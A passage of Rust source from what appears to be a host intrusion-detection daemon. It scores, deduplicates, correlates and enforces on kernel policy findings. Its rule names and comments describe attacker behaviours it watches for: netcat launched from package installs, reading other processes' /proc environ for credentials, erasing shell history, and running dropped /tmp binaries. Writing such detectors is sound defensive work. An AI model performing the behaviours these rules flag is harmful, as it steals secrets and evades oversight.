        match std::process::Command::new(&self.cfg.paths.tetra)
            .args(args)
            .output()
        {
            Ok(o) if o.status.success() => true,
            Ok(o) => {
                log::error!(
                    "tetra {}: {}",
                    args.join(" "),
                    String::from_utf8_lossy(&o.stderr).trim()
                );
                false
            }
            Err(e) => {
                log::error!("tetra {}: {}", args.join(" "), e);
                false
            }
        }
    }

    /// Is `path` inside one of moat's own directories?
    fn is_own_store(&self, path: &str) -> bool {
        let roots = [
            self.cfg.paths.state_dir.to_string_lossy().into_owned(),
            "/var/log/moat".to_string(),
        ];
        util::under_any(path, &roots)
    }

    /// The userland rules that end a process themselves, and are therefore
    /// armable one at a time exactly as a kernel policy is.
    ///
    /// `meta().enforce == "kill"` is the declaration; `maybe_enforce` does the
    /// signalling after re-verifying the pid's start time. Only ENABLED rules:
    /// offering to arm a rule that is switched off in `[rules]` would be a
    /// switch that does nothing.
    pub fn armable_userland_rules(&self) -> Vec<crate::policy::PolicyMeta> {
        self.rules
            .iter()
            .filter(|r| r.enabled(&self.cfg))
            .map(|r| r.meta())
            .filter(|m| m.enforce == "kill" || m.enforce == "deny")
            .collect()
    }

    /// The rules that can be armed, with what arming one does.
    ///
    /// Kernel policies **and** the userland rules that kill. Listing only the
    /// policies was the reason `moatctl set mode enforce --rule
    /// moat-pkg-subtree-netcat-exec` was refused outright: the two rules that
    /// act on their own were the two the per-rule switch could not reach, so
    /// the only way to make either of them kill was to arm every rule on the
    /// machine — the all-or-nothing that per-rule enforcement exists to avoid.
    fn enforceable(&self) -> Vec<serde_json::Value> {
        let policies = self
            .policies
            .names()
            .into_iter()
            .map(|name| self.policies.meta_or_fallback(&name))
            .filter(|m| m.enforce == "kill" || m.enforce == "deny");
        let mut out: Vec<serde_json::Value> = policies
            .chain(self.armable_userland_rules())
            .map(|meta| {
                json!({
                    "rule": meta.name,
                    "enforce": meta.enforce,
                    "title": meta.title,
                    "severity": meta.severity,
                    // What is actually doing the killing. A kernel policy is
                    // armed with `tetra tp set-mode`; a userland rule is armed
                    // in this daemon and pushes nothing into the kernel, and
                    // anything offering the switch should be able to say which.
                    "by": if self.policies.get(&meta.name).is_some() { "kernel" } else { "moatd" },
                    // What the rule is doing right now, which is what the switch
                    // on the Rules tab claims to show. Under a daemon-wide
                    // enforce every one of these kills, and `enforcing_rules`
                    // lists none of them.
                    "armed": self.mode_for(&meta.name) == "enforce",
                })
            })
            .collect();
        out.sort_by(|a, b| a["rule"].as_str().cmp(&b["rule"].as_str()));
        out
    }

    /// Does this history file belong to a real account? Human homes, plus
    /// root's -- not a "human home" by CONTRACT §2, but a trail worth covering.
    fn is_real_history(&self, path: &str) -> bool {
        util::under_any(path, &self.homes) || path.starts_with("/root/")
    }

    /// Does an ENABLED userland rule produce the findings for this policy id?
    ///
    /// Enabled matters: a rule switched off in config must not silence the
    /// kernel's own finding as well, or turning a rule off would turn its
    /// policy into pure overhead that reports nothing.
    fn rule_owns(&self, policy: &str) -> bool {
        if policy.is_empty() {
            return false;
        }
        self.rules.iter().any(|r| r.id() == policy && r.enabled(&self.cfg))
    }

    fn policy_finding(&self, hook: &HookHit, exec_id: &str, _now: u64) -> Option<Finding> {
        let name = hook.policy_name();
        if !name.starts_with("moat-") {
            return None;
        }
        let proc = self.table.get(exec_id)?.clone();
        // The kernel's own string, kept for the re-validation below: `validate`
        // asks whether the event still matches the selectors the kernel matched
        // on, so it has to see what the kernel saw.
        let raw_path = hook.file_path();
        // The path a person would recognise. A no-op for every `path`-typed
        // argument and on every non-btrfs machine; only a bare `dentry` needs
        // it, because a dentry carries no mount and resolves no further than
        // its own filesystem root (util::dentry_abs).
        let path = raw_path
            .as_deref()
            .map(|p| util::dentry_abs(p, &self.subvols));
        let hook_name = hook.hook_name();

        // Never alert on our own reads. Taking an incident snapshot means
        // reading /proc/<pid>/{environ,status,cmdline,fd} for the alerting
        // process and every live ancestor (incident.rs), and any file rule that
        // covers those paths turns that into a fresh alert — which takes another
        // snapshot, which reads more. A /proc/<pid>/environ rule under test on
        // 2026-09-03 produced 126 high alerts in four idle minutes this way.
        // The daemon watching its own evidence-gathering is a loop, not a
        // detection, so it is cut here rather than in each policy's
        // matchBinaries, where the next rule would forget it.
        if proc.pid == std::process::id() {
            return None;
        }

        // The environ rule matches `Postfix /environ` in the kernel, because a
        // selector cannot compare the path's pid against the opener's. The exact
        // cut is here: reading your own environment is not credential theft, and
        // it is essentially all of the traffic on this path.
        if name == "moat-cred-proc-environ-read" {
            let is_proc_environ = path
                .as_deref()
                .and_then(crate::rules::self_proc_read::proc_target_pid)
                .is_some();
            if !is_proc_environ {
                return None;
            }
            if crate::rules::self_proc_read::is_self_read(path.as_deref()?, proc.pid) {
                return None;
            }
        }

        // moat's own evidence store is not a place credentials get stolen from.
        //
        // Staging an incident copies the file the alert names into
        // /var/lib/moat/incidents/<id>/file/<name>. That copy is a
        // credential-shaped file in a directory the user can read, so the next
        // recursive search walks into it, reads it, and raises a fresh
        // `moat-cred-*` alert -- which stages another copy, which is fresh bait
        // for the next scan. On 2026-09-04 that loop was half of every
        // browser-secret alert on this machine (15 of 30) with 10 staged
        // copies, and the newest incident directory was named by an alert about
        // reading the previous one.
        //
        // This is the path-side twin of the `proc.pid` guard above: that one
        // stops moat alerting on what it READS, this one stops it alerting on
        // what is read FROM it. Rules whose subject is this directory are
        // exempt, so a tamper rule still sees a deletion here.
        if let Some(p) = path.as_deref() {
            if self.is_own_store(p) && !SELF_WATCH_RULES.contains(&name) {
                return None;
            }
        }

        // A history file is only a history file if it is somebody's. The
        // kernel matches this rule by name alone (`Postfix /.bash_history`),
        // because a selector cannot ask whose home a path is in -- that answer
        // is in /etc/passwd, which the kernel cannot read. So it fires on that
        // name anywhere on the filesystem: on 2026-09-04 moat's own test suite
        // tripped it when `rm -rf` removed a sandbox tempdir containing a
        // throwaway $HOME, and because this rule is in the `rootkit` family
        // that turned an ordinary build into a HIGH chain.
        //
        // The signal here is that a real record of what was typed is gone.
        // Erasing a history file that is nobody's history erases no trail, so
        // the cut is exactly "is this in a real account's home".
        if name == HISTORY_TAMPER && !self.is_real_history(path.as_deref()?) {
            return None;
        }

        if let Err(m) = self
            .policies
            .validate(name, &hook_name, raw_path.as_deref(), &proc.exe)
        {
            return Some(self.mismatch_finding(*m, exec_id, proc, path));
        }

        let meta = self.policies.meta_or_fallback(name);
        let mut f = Finding::new(name, meta, proc);
        f.family_fixup();
        f.hook = hook_name;
        f.exec_id = exec_id.to_string();
        f.ancestry = self.table.ancestry(exec_id).into_iter().cloned().collect();
        f.ancestry_line = self.table.ancestry_line(exec_id);
        // The mode that governed *this rule*, which is "enforce" for a rule
        // armed individually even while the daemon stays in monitor.
        f.mode = self.mode_for(name);
        f.kill_expected = hook.action_is_kill();
        // Tetragon reports the CONFIGURED action in monitor mode too (NOTES
        // §7 says so for Sigkill, and Override is the same field). The kill
        // path waits for process_exit to prove it; a refusal has no such
        // event, so the only honest gate is whether the kernel policy for
        // this rule was enforcing. Without it, every monitor-mode deny policy
        // recorded `action_taken: blocked` beside `mode: monitor` and told the
        // user a connection had been refused that went straight through.
        let configured_deny = hook.action_is_deny();
        f.denied = configured_deny && f.mode == "enforce";
        if f.denied {
            f.extra_evidence.push(
                "the kernel refused this operation: it returned EPERM to the program, which is \
                 still running and will have seen the call fail"
                    .to_string(),
            );
        } else if configured_deny {
            f.extra_evidence.push(
                "the policy is configured to refuse this, but it was in monitor mode: the \
                 operation went ahead and was only reported"
                    .to_string(),
            );
        }

        if let Some(path) = path {
            f.hook_detail = access_word(hook.int_arg());
            // A setuid bit an unprivileged user sets on a file that user
            // already owns grants nothing.
            //
            // setuid means "run as the file's OWNER". When the owner is the
            // uid already running, that is the identity it has; the bit
            // confers no privilege. This is the semantics of the bit, not a
            // fact about any build tool -- which matters, because the shape it
            // removes is every source build on this machine: `makepkg ->
            // fakeroot -> debugedit` chmodding a staged `chrome-sandbox` under
            // the user's own ~/.cache as uid 1000. That one step is what
            // pushed ordinary package updates to critical, through the
            // `priv + 2 families` rung in `chain::escalate`.
            //
            // The genuinely privileged moment -- pacman installing that file
            // 4755 and root-owned into /opt -- is a different event with a
            // different owner, and this leaves it alone.
            if is_setuid_rule(name) {
                if let Some(reason) = setuid_grants_nothing(&f, &path) {
                    f.meta.severity = "low".to_string();
                    f.extra_evidence.push(reason);
                }
            }
            f.file = Some(crate::alert::FileRef { path, sha256: None });
        } else if let Some((ip, port)) = hook.dest() {
            f.net = Some(crate::alert::NetRef {
                dst_ip: ip,
                dst_port: port,
                domain: None,
            });
        }

        // The kernel watches suspicious ports for every process; being inside a
        // package install is what turns "unusual" into "act on this".
        if name == SUSPICIOUS_PORT_EGRESS {
            if let Some((root, why)) = pkgtree::pkg_root_with_reason(&self.table, exec_id) {
                let from = std::mem::replace(&mut f.meta.severity, "high".into());
                f.extra_evidence.push(pkgtree::root_evidence(root, &why));
                f.extra_evidence.push(format!(
                    "raised from {} to high: the connecting process is inside a `{}` install, so \
                     this is an install script talking to an unusual port, not a program you started",
                    from,
                    root.comm()
                ));
            }
        }
        if let Some(msg) = &hook.ev.message {
            if !msg.is_empty() {
                f.extra_evidence.push(format!("policy message: {}", msg));
            }
        }
        if let Some(action) = &hook.ev.action {
            f.extra_evidence.push(format!(
                "policy action: {} (mode {}; a kill is only recorded once process_exit reports SIGKILL)",
                action, f.mode
            ));
        }
        Some(f)
    }

    /// The record we keep instead of raising a policy alert we cannot stand
    /// behind. Low severity on purpose: the sensor misbehaved, the workload did
    /// not, and the only useful action is to look at the policy.
    fn mismatch_finding(
        &self,
        m: Mismatch,
        exec_id: &str,
        proc: crate::proctable::ProcInfo,
        path: Option<String>,
    ) -> Finding {
        let would_be = self.policies.meta_or_fallback(&m.policy);
        let mut f = Finding::new(
            crate::rules::SENSOR_MISMATCH,
            crate::rules::sensor_mismatch_meta(&m.why()),
            proc,
        );
        f.hook = m.hook.clone();
        f.exec_id = exec_id.to_string();
        f.ancestry = self.table.ancestry(exec_id).into_iter().cloned().collect();
        f.ancestry_line = self.table.ancestry_line(exec_id);
        f.mode = self.mode.clone();
        f.what_override = Some(format!(
            "Tetragon reported {} for {}, which that policy's own selectors exclude, so no {} alert was raised.",
            m.policy, m.reported, m.policy
        ));
        f.extra_evidence = vec![
            format!(
                "policy: {} (would have been {}: {})",
                m.policy, would_be.severity, would_be.title
            ),
            format!("reported by the kernel: {}", m.reported),
            m.selector_line(),
            "the suppressed policy alert is not in alerts.jsonl; this record is kept so a \
             misbehaving sensor is visible rather than silent"
                .to_string(),
        ];
        if let Some(p) = path {
            f.file = Some(crate::alert::FileRef {
                path: p,
                sha256: None,
            });
        }
        f
    }

    fn emit_all(&mut self, findings: Vec<Finding>) {
        for f in findings {
            self.emit(f);
        }
    }

    /// Score, look up rarity, apply the allowlist, dedupe, append.
    ///
    /// BASELINE §8 changed the shape of this path: a suppressed alert is no
    /// longer dropped on the floor. It is scored, counted for rarity, recorded
    /// with `suppressed_by` set so the timeline can grey it out, and left out of
    /// the badge — because a suppression the user cannot see is exactly the kind
    /// of silence this project promises not to produce.
    pub fn emit(&mut self, mut f: Finding) -> Option<String> {
        let now = util::unix_secs();

        // --- 0. the mode that governed THIS rule ---------------------------
        // Stamped here, once, for every finding whatever path built it. The
        // policy path already did this; the userland rules (`RuleCtx::finding`)
        // wrote the daemon-wide mode instead, so `moat-net-first-contact` --
        // which is both a policy and a userland rule -- recorded `mode:
        // monitor` on the alert while `status.enforcing_rules` listed it.
        f.mode = self.mode_for(&f.rule);

        // --- 1. who acted, and from where (BASELINE §1 and §2b) -------------
        f.actor = self.provenance.classify_proc(&f.proc);
        f.context = context::classify(&self.table, &f.exec_id, &self.cfg.context);
        f.extra_evidence.push(context::evidence(
            &self.table,
            &f.exec_id,
            f.context,
            &self.cfg.context,
        ));

        // --- 2. severity (BASELINE §2 and §2b) ------------------------------
        let build_tool = self.build_tool_in_chain(&f.exec_id);
        let score = {
            let facts = EventFacts {
                family: &f.meta.family,
                rule: &f.rule,
                hook: &f.hook,
                exe: &f.proc.exe,
                file: f.file.as_ref().map(|x| x.path.as_str()),
                has_net: f.net.is_some(),
                has_ioc: f.ioc.is_some(),
                build_tool_in_chain: build_tool,
                homes: &self.homes,
            };
            scoring::score(
                &f.meta.severity,
                &facts,
                &f.actor,
                f.context,
                self.cfg.baseline.provenance_downgrade,
            )
        };
        f.score = Some(score);

        // --- 3. rarity (LEARNING §1), whether or not this is suppressed -----
        f.rarity = Some(self.observe_rarity(&f, now));

        // --- 4. allowlist: suppression is recorded, not silent --------------
        let parents: Vec<String> = f.ancestry.iter().map(|p| p.exe.clone()).collect();
        let cand = Candidate {
            rule: &f.rule,
            exe: &f.proc.exe,
            file: f.file.as_ref().map(|x| x.path.as_str()),
            parents,
        };
        if let Some(hit) = self.allowlist.find(&cand) {
            let by = format!(
                "{}#{}",
                hit.source
                    .file_name()
                    .map(|n| n.to_string_lossy().to_string())
                    .unwrap_or_else(|| hit.source.display().to_string()),
                hit.index
            );
            log::debug!("{} suppressed by allowlist entry {}", f.rule, by);
            f.suppressed_by = Some(by);
        }

        // --- 5. the noise guard's demotion is not a suppression -------------
        // Demotion is scoped to the tuple that was noisy, not the whole rule
        // (BASELINE §4): a rule silenced by this machine's own builds must not
        // also silence a shape of it that nobody has ever seen.
        f.demoted = self
            .baseline
            .is_demoted_tuple(&f.rule, &noise_tuple(&f));

        // --- 6. the receipt sees it too (LEARNING §3) -----------------------
        // Suppressed findings included: the write still happened, and a receipt
        // records what the install did, not what moat shouted about.
        self.note_receipt_finding(&f);

        // Is this a fold of an alert we already have?
        let key = f.dedupe_key();
        let folded = self
            .dedupe
            .get(&key)
            .filter(|d| now.saturating_sub(d.first_seen) < self.cfg.thresholds.dedupe_secs)
            .map(|d| d.id.clone());

        // The id is allocated here, before anything is killed, because the
        // incident snapshot is named after it and has to be taken while the
        // process still exists (LEARNING §4). A fold reuses the first id and is
        // not captured twice.
        let id = match folded.clone() {
            Some(existing) => existing,
            None => self.next_id(),
        };
        let incident = if folded.is_none() {
            self.capture_incident(&f, &id)
        } else {
            None
        };

        // Enforcement happens before dedupe: the second `nc` of an install is
        // just as fatal as the first, even when its alert folds into one line.
        // A suppressed finding is never enforced — the user said it is fine.
        let killed = if f.suppressed_by.is_none() {
            self.maybe_enforce(&mut f)
        } else {
            false
        };

        if let Some(existing) = folded {
            let count = match self.dedupe.get_mut(&key) {
                Some(d) => {
                    d.count += 1;
                    d.count
                }
                None => 1,
            };
            let mut update = UpdateLine::new(&existing)
                .set("count", Value::from(count))
                .set("ts", Value::from(util::now_rfc3339()));
            if killed {
                update = update.set("action_taken", Value::from("killed"));
            }
            if let Err(e) = self.store.append_update(&update) {
                log::error!("alerts.jsonl: {}", e);
            }
            self.note_baseline(&f, now);
            return Some(existing);
        }

        let note = allowlist_note(
            &self.cfg.paths.allowlist_dir.display().to_string(),
            self.allowlist.len(),
            &f.proc.exe,
            f.file.as_ref().map(|x| x.path.as_str()),
        );
        let mut alert = build_alert(
            &f,
            &id,
            &util::now_rfc3339(),
            &self.cfg.paths.user_allowlist().display().to_string(),
            &note,
        );
        if killed {
            alert.action_taken = "killed".into();
        }
        if let Err(e) = self.store.append_alert(&alert) {
            log::error!("alerts.jsonl: {}", e);
            return None;
        }
        // The snapshot is appended as an update rather than being folded into
        // the record above, so a slow /proc walk can never delay the alert
        // itself (LEARNING §9).
        if let Some(inc) = incident {
            self.incidents_captured += 1;
            log::info!(
                "alert {}: incident snapshot in {} ({} file(s))",
                id,
                inc.dir,
                inc.files.len()
            );
            let u = UpdateLine::new(&id).set(
                "incident",
                serde_json::to_value(&inc).unwrap_or(Value::Null),
            );
            if let Err(e) = self.store.append_update(&u) {
                log::error!("alerts.jsonl: {}", e);
            }
        }
        // Correlation runs on the record, after it exists, because a chain is
        // written back onto every member — including members that were already
        // on disk before this one made the sequence visible.
        self.note_chain(&f, &alert, now);
        if alert.is_suppressed() {
            self.alerts_suppressed += 1;
        } else {
            self.alerts_emitted += 1;
        }
        log::info!(
            "alert {} {} {} pid {} ({}){}",
            id,
            alert.severity,
            alert.rule,
            alert.process.pid,
            alert.title,
            alert
                .suppressed_by
                .as_ref()
                .map(|b| format!(" [suppressed by {}]", b))
                .unwrap_or_default()
        );
        self.dedupe.insert(
            key,
            Dedupe {
                id: id.clone(),
                first_seen: now,
                count: 1,
            },
        );
        if f.kill_expected && !f.exec_id.is_empty() {
            self.pending_kill.insert(f.exec_id.clone(), id.clone());
        }

        self.note_baseline(&f, now);
        // Only what the user can actually SEE counts as noise.
        //
        // Three exclusions, for the same reason. A suppressed alert is one the
        // user already answered; a `signal`-tier row is one the RULE says is
        // not a conclusion; and a finding that never reaches the badge on
        // severity is not something anyone is being asked about -- demoting it
        // would move it from the timeline to the timeline, while still raising
        // a `moat-x-noisy-rule` alert that DOES surface. Counting timeline rows
        // would mean every `sudo` on the machine (medium, timeline, by design)
        // producing a noise complaint within a day, and then -- through the
        // re-demotion counter -- an offer to allowlist sudo. Noise about
        // noise, generated by the machinery meant to reduce it.
        //
        // Deliberately `surface_for(severity)` and NOT `alert.surface`: a row
        // this guard has already demoted still has to be counted, or the
        // rolling 24 h window would age out under a live flood and
        // `clear_stale_demotions` would hand the flood back to the badge.
        // `note_alert` returns `None` for an already-demoted tuple, so counting
        // it costs one map lookup and raises nothing.
        let on_the_badge = crate::scoring::surface_for(f.severity()) == "alerts";
        if f.suppressed_by.is_none() && !f.is_building_block() && on_the_badge {
            if let Some(d) = self.baseline.note_alert(&f.rule, &noise_tuple(&f), now) {
                self.quieten_backlog(&d);
                self.raise_noisy_rule(&d, now);
            }
        }
        Some(id)
    }

    /// BASELINE §4's retroactive half, done by the one party that knows the
    /// demotion's real scope.
    ///
    /// "Stop asking me about this" has to cover what is already on the badge,
    /// not only what comes next. Until now that was the PANEL's job: it read
    /// `status.demoted_rules` and timelined every alert of every listed rule.
    /// But that list is the one a person wants -- a rule with a single noisy
    /// pattern is on it -- while a demotion here is per pattern, and the chain
    /// correlator re-surfaces a demoted rule's step on purpose when a sequence
    /// reaches `high`. So the panel silenced things this daemon had
    /// deliberately surfaced: on 2026-09-05 a 64-step `makepkg` chain raised
    /// to `high` read "expected" on every screen because its rules were on
    /// the list. Restamping the covered backlog HERE, per pattern, means the
    /// panel can read `surface` and nothing else.
    ///
    /// Only alerts the demotion actually covers move: unacked, on the badge,
    /// this rule, and this pattern. Two are left alone.
    ///
    /// A trigger step of a chain that reached `high`: the correlator put it
    /// back on the badge knowing the rule was noisy, and the noise guard does
    /// not get to undo correlation.
    ///
    /// And an alert the context matrix escalated inside a **package install**.
    /// That is the 2026-09-04 failure closed in general rather than for one
    /// path: a `/tmp` dropper executed by a package `preinstall` went to the
    /// timeline because the developer's own `cargo test` had made a different
    /// shape of the same rule noisy. Frequency on this machine is not evidence
    /// about a package install, and a demotion is arithmetic about frequency.
    fn quieten_backlog(&mut self, d: &Demotion) {
        let high = crate::alert::severity_rank("high");
        let mut moved = 0usize;
        for a in self.store.load() {
            if a.rule != d.rule || a.acked || a.surface != "alerts" {
                continue;
            }
            if a.tuple_key() != d.tuple {
                continue;
            }
            if a.pkg_install_escalation {
                continue;
            }
            let raised_by_chain = a.chain.as_ref().map_or(false, |c| {
                crate::alert::severity_rank(&c.severity) >= high
                    && c.steps.iter().any(|s| s.alert == a.id && s.is_trigger())
            });
            if raised_by_chain {
                continue;
            }
            let u = UpdateLine::new(&a.id).set("surface", Value::from("timeline"));
            if let Err(e) = self.store.append_update(&u) {
                log::error!("alerts.jsonl: {}", e);
                return;
            }
            moved += 1;
        }
        if moved > 0 {
            log::info!(
                "noise guard: {} earlier alert(s) of {} moved to the timeline with the demotion",
                moved,
                d.rule
            );
        }
    }

    /// Offer a freshly written alert to the chain correlator, and write the
    /// resulting sequence back onto every alert in it (design 2b, 3a).
    ///
    /// Only whole alerts get here — a dedupe fold is the same event again, and
    /// a story is about different events. That also keeps the write cost tied
    /// to the number of distinct alerts rather than to a burst's volume.
    ///
    /// Each member carries the entire chain, rather than a pointer to a head
    /// record, so a reader that has folded `alerts.jsonl` can draw 2b from
    /// whichever alert the user opened without a second lookup. The cost is
    /// that a growing chain rewrites itself onto its members; `ChainStore::note`
    /// only hands one back when the story on disk actually changed, which caps
    /// that at roughly `MAX_STEPS` (12) republishes of at most `MAX_STEPS` lines
    /// each — a few hundred kB against a 20 MB rotation, however many
    /// detections one tree trips.
    fn note_chain(&mut self, f: &Finding, alert: &Alert, now: u64) {
        let lineage: Vec<chain::LineageNode> = std::iter::once(&f.proc)
            .chain(f.ancestry.iter())
            .map(|p| chain::LineageNode {
                exec_id: p.exec_id.clone(),
                pid: p.pid,
                exe: p.exe.clone(),
                sid: p.sid,
            })
            .collect();
        let Some(c) = self.chains.note(chain::Observation {
            alert: alert.id.clone(),
            ts: alert.ts.clone(),
            at: now,
            family: alert.family.clone(),
            rule: alert.rule.clone(),
            severity: alert.severity.clone(),
            title: alert.title.clone(),
            rarity: alert.rarity,
            // "Silenced" means *someone decided this specific thing is fine*:
            // the user's own allowlist entry, or the noise guard having watched
            // this exact tuple fire all day. Both are on the finding already.
            //
            // It deliberately does NOT read `alert.surface`. That was the bug
            // behind the 2026-09-04 20:41 miss: `scoring::surface_for` is a
            // pure function of severity — medium and low are *always*
            // `timeline` — so testing it here silently reimposed a `high` floor
            // on every trigger, on top of the documented `medium` one, and a
            // chain of two mediums could never form. A rule that is weak on its
            // own is the whole reason this module exists; it is the prime
            // candidate for a sequence, not a thing to discount.
            // ONLY the user's own allowlist silences a step.
            //
            // A noise-guard demotion used to count here too, and it is a
            // different kind of statement: the allowlist is the user saying
            // "this event is fine", while the guard is moat's own arithmetic
            // about how OFTEN a rule fires on this machine. Frequency is not
            // consent, and correlation exists precisely because events that are
            // ordinary alone are not ordinary together -- so letting the volume
            // heuristic veto a step meant any rule that ever got noisy became
            // permanently unable to contribute to a sequence.
            //
            // On 2026-09-04 that hid a live AUR attack: `makepkg` egressed to a
            // host outside the registry and executed a dropped binary from
            // /tmp, and the /tmp exec -- `high`, `first_seen`, the strongest
            // signal in the whole run -- was demoted rule-wide because the
            // user's own `cargo test` trips the same rule. It joined the chain
            // as context, the remaining triggers were `low`/`medium`, and the
            // chain came out `medium` with nothing on the badge.
            silenced: f.suppressed_by.is_some(),
            lineage,
        }) else {
            return;
        };
        log::warn!(
            "chain {} {} ({} steps, {}): {}",
            c.id,
            c.severity,
            c.steps_total,
            c.severity_reason,
            c.summary
        );
        let value = match serde_json::to_value(&c) {
            Ok(v) => v,
            Err(e) => {
                log::error!("chain {}: {}", c.id, e);
                return;
            }
        };
        // A chain that reaches `high` has to be able to reach the BADGE.
        //
        // `surface` is stamped per alert, by a rule that only ever saw one
        // event, so a chain whose members are each on the timeline stayed
        // invisible no matter what the correlation concluded. On 2026-09-04 an
        // AUR build egressed to a host outside the registry and ran a dropped
        // binary from /tmp; every member was `timeline` because the noise guard
        // had demoted those rules, and the user saw nothing at all.
        //
        // Only trigger steps are restamped. A context step is one the USER
        // allowlisted, and a sequence is not a licence to go back on that --
        // it still shows in the story, it just does not start shouting.
        let raise = crate::alert::severity_rank(&c.severity)
            >= crate::alert::severity_rank("high");
        let triggers: std::collections::HashSet<&str> = c
            .steps
            .iter()
            .filter(|s| s.is_trigger())
            .map(|s| s.alert.as_str())
            .collect();

        self.maybe_contain(&c, now);
        self.maybe_kill_tree(&c, now);
        if crate::alert::severity_rank(&c.severity) >= crate::alert::severity_rank("high") {
            // Content analysis first: quarantine moves the file into moat's own
            // store, which the analyser refuses to read, so the order is not a
            // preference.
            self.analyse_chain_artifacts(&c);
            self.quarantine_chain_artifacts(&c);
        }

        for member in c.member_ids() {
            let mut u = UpdateLine::new(&member).set("chain", value.clone());
            if raise && triggers.contains(member.as_str()) {
                u = u.set("surface", Value::from("alerts"));
            }
            if let Err(e) = self.store.append_update(&u) {
                log::error!("alerts.jsonl: {}", e);
                return;
            }
        }
    }

    /// Which of the four rarity tuples this finding is about. An alert with no
    /// file and no destination reuses the (actor, parent) count taken at exec
    /// time rather than double-counting it.
    fn observe_rarity(&mut self, f: &Finding, now: u64) -> RarityInfo {
        if let Some(file) = &f.file {
            let verb = match f.hook_detail.as_deref() {
                Some(d) if d.starts_with("read") => "read",
                Some(d) if d.starts_with("write") || d.starts_with("append") => "written to",
                _ if f.hook == "bprm_check_security" => "executed something in",
                _ => "touched",
            };
            return self
                .rarity
                .observe(&Tuple::file(&f.proc.exe, &file.path, verb), now);
        }
        if let Some(net) = &f.net {
            return self.rarity.observe(
                &Tuple::net(&f.proc.exe, &net.dst_ip, net.dst_port, net.domain.as_deref()),
                now,
            );
        }
        if let Some(info) = self.exec_rarity.get(&f.exec_id) {
            return info.clone();
        }
        match f.ancestry.first() {
            Some(p) => self.rarity.observe(
                &Tuple::Parent {
                    exe: f.proc.exe.clone(),
                    parent: p.exe.clone(),
                },
                now,
            ),
            None => RarityInfo::unknown(),
        }
    }

    /// Copy an existing benign verdict onto un-triaged alerts of the same tuple,
    /// and return how many were filled in (LEARNING §2c).
    ///
    /// The cheap half of the cost problem. An agent call is 1.5-3.5 minutes and
    /// a paid request; a tuple that re-fires a hundred times is a hundred of
    /// them for one question that was answered the first time.
    ///
    /// What it deliberately does not do is demote. An inherited verdict shows
    /// the same explanation and leaves the alert exactly where it was, because
    /// acting on a verdict nobody gave about *this* event would be the model
    /// silencing a whole tuple off one read -- the thing `decide`'s ceiling
    /// exists to prevent. Waste is worth fixing; silence is not worth buying.
    pub fn inherit_triage_by_tuple(&mut self) -> usize {
        let alerts = self.store.load();
        // Newest benign verdict per tuple, with the rarity it was read at.
        let mut source: std::collections::HashMap<String, (&crate::alert::Alert, &crate::triage::Triage)> =
            std::collections::HashMap::new();
        for a in &alerts {
            let Some(t) = a.triage.as_ref() else { continue };
            if t.result.verdict != crate::triage::Verdict::Benign {
                continue;
            }
            // Never inherit from a record that was itself inherited: one real
            // read must not become an unbounded chain of copies.
            if t.outcome.starts_with("inherited:") {
                continue;
            }
            let key = a.tuple_key();
            match source.get(&key) {
                Some((prev, _)) if prev.ts >= a.ts => {}
                _ => {
                    source.insert(key, (a, t));
                }
            }
        }
        if source.is_empty() {
            return 0;
        }
        let now = crate::util::now_rfc3339();
        let mut todo = Vec::new();
        for a in &alerts {
            if a.acked || a.triage.is_some() || a.surface != "alerts" {
                continue;
            }
            let Some((src, prior)) = source.get(&a.tuple_key()) else { continue };
            if src.id == a.id {
                continue;
            }
            if !crate::triage::may_inherit(
                prior,
                &src.ts,
                &now,
                src.rarity.as_str(),
                a.rarity.as_str(),
            ) {
                continue;
            }
            todo.push((
                a.id.clone(),
                crate::triage::record_inherited(prior, &src.id, &now),
            ));
        }
        let mut done = 0usize;
        for (id, record) in todo {
            let value = serde_json::to_value(&record).unwrap_or(serde_json::Value::Null);
            if self.mark(&id, "triage", value).is_ok() {
                done += 1;
            }
        }
        if done > 0 {
            log::info!("triage: {} alert(s) inherited an existing verdict", done);
        }
        done
    }

    /// Feed the (rule, actor exe, parent exe, file dir) tuple to the baseline,
    /// and act on what it decides (BASELINE §3).
    fn note_baseline(&mut self, f: &Finding, now: u64) {
        let severity = f.severity().to_string();
        // What the rule itself decided, before the context matrix escalated it.
        // The baseline gates on this (BASELINE §3): escalation is a statement
        // about circumstances, and circumstances are what a baseline is for.
        let severity_base = f
            .score
            .as_ref()
            .map(|s| s.severity_base.clone())
            .unwrap_or_else(|| severity.clone());
        let parent = f.parent_exe();
        let dir = f.file_dir();
        let rarity = f
            .rarity
            .as_ref()
            .map(|r| r.class.as_str())
            .unwrap_or("first_seen");
        let decision = self.baseline.observe(&Observation {
            rule: &f.rule,
            exe: &f.proc.exe,
            parent: &parent,
            dir: &dir,
            severity: &severity,
            severity_base: &severity_base,
            provenance: f.actor.provenance.as_str(),
            package: f.actor.package.clone(),
            context: f.context.as_str(),
            rarity,
            suppressed: f.suppressed_by.is_some(),
            demoted: f.demoted,
            ts: util::now_rfc3339(),
            now,
        });
        match decision {
            Learned::Entry { key, toml, comment } => {
                let path = self.cfg.paths.baseline_allowlist();
                match write_learned(&path, &comment, &toml) {
                    Ok(()) => {
                        log::info!("baseline: learned {} ({})", f.rule, comment);
                        self.reload_allowlist();
                    }
                    Err(e) => {
                        log::warn!("{}: {}", path.display(), e);
                        self.baseline.mark_revoked(&key, &format!("could not be written: {}", e));
                    }
                }
            }
            Learned::Proposed { id } => {
                log::info!(
                    "baseline: {} recurs from {}; proposal {} is waiting for review",
                    f.rule,
                    f.proc.exe,
                    id
                );
            }
            Learned::None => {}
        }
    }

    fn build_tool_in_chain(&self, exec_id: &str) -> bool {
        self.table.chain_has(exec_id, scoring::BUILD_TOOLS).is_some()
    }

    // ------------------------------------------- install receipts, LEARNING §3

    /// One exec inside a package subtree. The root gets an accumulator the first
    /// time anything in its tree is seen, so a daemon that started mid-install
    /// still produces a (partial, honest) receipt.
    fn note_receipt_exec(&mut self, exec_id: &str, now: u64) {
        let Some(root) = pkgtree::pkg_root_for(&self.table, exec_id).cloned() else {
            return;
        };
        let Some(me) = self.table.get(exec_id).cloned() else {
            return;
        };
        self.receipts.ensure(&root, now);
        if root.exec_id != me.exec_id {
            self.receipts.note_exec(&root.exec_id, &me);
        }
    }

    /// One finding attributed to a package subtree.
    fn note_receipt_finding(&mut self, f: &Finding) {
        if f.exec_id.is_empty() {
            return;
        }
        let Some(root) = pkgtree::pkg_root_for(&self.table, &f.exec_id).cloned() else {
            return;
        };
        self.receipts.ensure(&root, util::unix_secs());
        let net = f
            .net
            .as_ref()
            .map(|n| n.domain.clone().unwrap_or_else(|| n.dst_ip.clone()));
        self.receipts.note_finding(
